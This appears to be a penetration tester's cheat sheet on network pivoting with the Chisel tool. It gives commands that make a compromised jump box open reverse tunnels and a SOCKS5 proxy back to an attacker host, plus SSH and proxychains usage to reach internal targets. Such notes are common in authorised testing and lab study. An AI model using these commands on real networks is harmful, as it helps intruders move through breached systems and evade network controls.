Using CHISEL:
---

single port on attacker machine

```bash
chisel server --port 8000 --reverse
```

from jump box

```bash
./chisel client $ATTACKER_IP:8000 R:$PORT:$DEST_IP:$PORT
```

 Opening socks5 server on LOCAL machine on port 1080

```bash
chisel server --port 8001 --socks5 --reverse
```

on jump box

```bash
./chisel client --max-retry-count 1 $ATTACKER_IP:8001 R:socks
```

or as a background process to free up the shell

```bash
./chisel client --max-retry-count 1 $ATTACKER_IP:8001 R:socks > /dev/null 2>&1 &
```

using ssh with chisel socks:

```bash
#on kali
chisel server --port 8080 --reverse
#on middle box
chisel client $KALI_IP:8080 R:socks > /dev/null 2>&1 &
#finally on kali
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' $USER@$TARGET_IP
```

Then edit proxychains config:
  
```config
socks5 127.0.0.1 1080
```

Execute commands with

```bash
proxychains -q
```

in front of them